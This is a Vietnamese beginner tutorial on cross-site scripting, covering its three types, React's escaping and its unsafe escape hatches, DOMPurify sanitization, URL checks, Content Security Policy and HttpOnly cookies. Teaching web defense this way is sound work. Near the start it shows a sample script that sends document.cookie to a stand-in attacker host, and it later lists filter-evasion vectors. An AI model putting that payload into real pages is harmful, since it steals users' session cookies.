---
title: XSS — Cross-Site Scripting
slug: xss-cross-site-scripting
summary: Chèn JavaScript vào trang của người khác — ba loại XSS và các lớp phòng thủ tương ứng.
level: co-ban
tags: [owasp, xss, frontend]
---

> **Sau bài này bạn sẽ:** biết chỗ nào trong code React vẫn có thể dính XSS, và cấu hình được CSP làm lớp phòng thủ thứ hai.

## Cơ chế và hậu quả

Người tấn công đưa được JavaScript vào trang mà nạn nhân đang mở. Đoạn script đó chạy với **toàn quyền của nạn nhân**: đọc cookie, gửi request nhân danh họ, thay đổi nội dung trang, ghi lại phím gõ.

```html
<!-- Người dùng nhập tên là: -->
<script>fetch('https://kegian.com?c=' + document.cookie)</script>
```

Nếu tên này được render thẳng vào HTML, mọi người xem trang đều bị gửi cookie đi.

## Ba loại

| Loại | Đường đi | Ví dụ |
|---|---|---|
| **Stored** | Lưu vào DB, mọi người xem đều dính | Bình luận chứa script |
| **Reflected** | Từ URL phản chiếu ngay vào trang | `?q=<script>...` trên trang kết quả tìm kiếm |
| **DOM-based** | JavaScript client tự ghi vào DOM | `el.innerHTML = location.hash` |

Stored nguy hiểm nhất vì nó tự lan tới mọi người xem.

## Cách sửa chính: escape khi render

React tự escape mọi giá trị đặt trong JSX:

```tsx
<div>{tenNguoiDung}</div>     // an toàn — mọi <, >, & thành thực thể HTML
```

Đây là lý do ứng dụng React ít dính XSS. Nhưng có những cửa hậu:

```tsx
// 1. dangerouslySetInnerHTML — đúng như tên gọi
<div dangerouslySetInnerHTML={{ __html: noiDung }} />

// 2. href/src nhận javascript:
<a href={urlTuNguoiDung}>Link</a>       // href="javascript:alert(1)"

// 3. Thao tác DOM trực tiếp
element.innerHTML = duLieu
```

### Xử lý HTML do người dùng nhập

Khi thật sự cần render HTML (trình soạn thảo rich text), phải **làm sạch** trước:

```ts
import DOMPurify from 'isomorphic-dompurify'

const sach = DOMPurify.sanitize(noiDungThoNguoiDung, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'title'],
})
```

Không bao giờ tự viết bộ lọc bằng regex. Danh sách các cách né tránh dài tới mức không ai nhớ hết: `<img onerror>`, `<svg onload>`, `<iframe srcdoc>`, thuộc tính có ký tự null, mã hoá entity nhiều lớp...

Lưu ý về ngữ cảnh: markdown do **chính chủ sở hữu** viết (như trong một sổ tay cá nhân) khác hẳn HTML do **người lạ trên internet** gửi lên. Mức phòng thủ nên tương xứng với nguồn dữ liệu, và điều đó phải được ghi rõ trong code để không ai vô tình mở rộng nguồn về sau.

### Kiểm tra URL

```ts
function urlAnToan(url: string): string {
  try {
    const parsed = new URL(url, 'https://example.com')
    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? url : '#'
  } catch {
    return '#'
  }
}
```

## Content Security Policy — lớp thứ hai

CSP nói cho trình duyệt biết được phép tải script từ đâu. Ngay cả khi XSS lọt qua, script vẫn không chạy được:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{giaTriNgauNhien}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

Điểm mấu chốt: **không dùng `'unsafe-inline'` cho script**. Nó vô hiệu hoá gần như toàn bộ tác dụng chống XSS của CSP. Dùng nonce (giá trị ngẫu nhiên sinh mới mỗi request) hoặc hash thay thế.

Triển khai dần bằng `Content-Security-Policy-Report-Only` để xem cái gì sẽ bị chặn trước khi bật thật.

## Cookie an toàn

```
Set-Cookie: phien=abc; HttpOnly; Secure; SameSite=Lax; Path=/
```

`HttpOnly` khiến JavaScript không đọc được cookie — XSS xảy ra thì cũng không lấy được token phiên. Đây là lý do **không bao giờ lưu token xác thực trong `localStorage`**: nó luôn đọc được từ JavaScript.

## Lỗi hay gặp

| Lỗi | Hậu quả | Sửa thế nào |
|---|---|---|
| `dangerouslySetInnerHTML` với dữ liệu người lạ | Stored XSS | DOMPurify |
| `href={urlNguoiDung}` | `javascript:` chạy được | Kiểm tra protocol |
| Tự viết regex lọc thẻ | Luôn có cách né | Dùng thư viện sanitize |
| Token trong `localStorage` | XSS lấy được token | Cookie `HttpOnly` |
| CSP có `'unsafe-inline'` | CSP gần như vô tác dụng | Dùng nonce |

## Ghi nhớ

- React escape mặc định; cửa hậu là `dangerouslySetInnerHTML`, `href`, và thao tác DOM.
- Sanitize bằng thư viện, không bằng regex tự viết.
- CSP là lớp phòng thủ thứ hai — nhưng không kèm `'unsafe-inline'`.
- Token phiên thuộc về cookie `HttpOnly`, không thuộc `localStorage`.

## Tự kiểm tra

1. Ba loại XSS khác nhau ở đường đi thế nào?
2. Vì sao `'unsafe-inline'` làm CSP mất tác dụng chống XSS?
3. Cần cho phép người dùng viết bình luận có định dạng đậm/nghiêng — làm thế nào cho an toàn?
